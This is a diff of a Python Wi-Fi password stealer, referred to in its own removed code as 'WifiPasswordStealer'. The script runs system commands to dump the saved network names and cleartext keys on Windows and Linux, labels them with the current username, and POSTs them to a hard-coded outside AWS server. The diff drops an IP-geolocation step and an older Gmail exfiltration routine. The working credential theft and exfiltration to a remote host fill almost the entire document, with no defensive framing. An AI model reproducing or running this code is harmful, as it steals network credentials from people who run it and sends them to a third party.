@@ -20,8 +20,6 @@ URL = 'http://ipinfo.io/json'
 
 def main():
     identify()
-    # get_ip()
-    # get_passwords()
     send()
 
 
@@ -31,23 +29,9 @@ def identify():
     OS = sys.platform
 
 
-def get_ip():
-    file = open(MAC, 'w')
-    response = urllib.request.urlopen(URL).read()
-    data = json.loads(response.decode('utf-8'))
-    file.write("IP = " + data['ip'] + "\n")
-    file.write("ISP = " + data['org'] + "\n")
-    file.write("City = " + data['city'] + "\n")
-    file.write("State = " + data['region'] + "\n")
-    file.write("Country = " + data['country'] + "\n")
-    file.write("\n ---------------------- \n" + "\n")
-
-
 def get_passwords():
-    # file = open(MAC, 'a')
     dataToBeSent = {}
     dataList = []
-
 
     if OS == 'win32':
         output = subprocess.check_output(COMMAND_WINDOWS).decode('ascii').split('\n')
@@ -60,9 +44,9 @@ def get_passwords():
             except:
                 pass
 
-    # Get PSK of each SSID
-    # SSID[0]=<blank> which when given to below check_output() causes error .
-    # So the try except handles it
+        # Get PSK of each SSID
+        # SSID[0]=<blank> which when given to below check_output() causes error .
+        # So the try except handles it
         for ssid in SSID:
             try:
                 Password = subprocess.check_output(COMMAND_WINDOWS + ' name="' + ssid + '" key=clear').decode('ascii')
@@ -71,64 +55,37 @@ def get_passwords():
                 temp["ssid"] = ssid
                 temp["pass"] = PSK
                 dataList.append(temp)
-        # file.write(ssid + ',' + PSK + '\n')
-        # print(ssid,'  ',PSK)
             except:
                 pass
 
     elif OS == "linux" or OS == "linux2" or OS == "linux3":
         output = subprocess.check_output(COMMAND_LINUX, shell=True).decode('utf-8').split('\n')
-    for pair in output:
-        try:
-            pair = re.findall(RE_LINUX, pair)[0].split(':')
-            ssid = pair[0]
-            psk = pair[1].split('=')[1]
-            temp = {}
-            temp["ssid"] = ssid
-            temp["pass"] = psk
-            dataList.append(temp)
-    # file.write(ssid + ',' + psk + '\n')
-        except:
-            pass
+        for pair in output:
+            try:
+                pair = re.findall(RE_LINUX, pair)[0].split(':')
+                ssid = pair[0]
+                psk = pair[1].split('=')[1]
+                temp = {}
+                temp["ssid"] = ssid
+                temp["pass"] = psk
+                dataList.append(temp)
 
-    else:
-        print("No support for this OS as yet !!")
+            except:
+                pass
 
-    dataToBeSent["data"] = dataList
+    dataToBeSent[os.getenv('username')] = dataList
     return dataToBeSent
-
-# file.close()
 
 
 def send():
-    '''EMAIL_ADDRESS = "" # insert email address from which email must be sent
-    EMAIL_PASSWORD = "" # insert app password given by gmail
-
-    contacts = [] # Add email addresses to which email must be sent in this list
-		   # example : [ "abc@xyz.com" , "def@ghi.com" ]
-
-    msg = EmailMessage()
-    msg['Subject'] = "WifiPasswordStealer Report"
-    msg['From'] = EMAIL_ADDRESS
-    msg['To'] = contacts
-
-    file_size = get_file_size(MAC)
-    #print("Size of MAC = ", file_size)
-
-    with open(MAC, 'r') as f:
-        stuff = f.read(file_size)
-        msg.set_content(stuff)
-
-    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
-        smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
-        smtp.send_message(msg)'''
-
     url = "http://ec2-3-83-115-206.compute-1.amazonaws.com:3000/users/storePass"
     jsonData = get_passwords()
-    #data = json.dumps(jsonData)
-    r = requests.post(url=url, json = jsonData)
-    #print(json.loads(data))
-    
+    # data = json.dumps(jsonData)
+    print(jsonData)
+    r = requests.post(url=url, json=jsonData)
+    # print(json.loads(data))
+
+
 def get_file_size(file_name):
     path = os.path.dirname(os.path.realpath(file_name))
     return os.path.getsize(path + "/" + file_name)
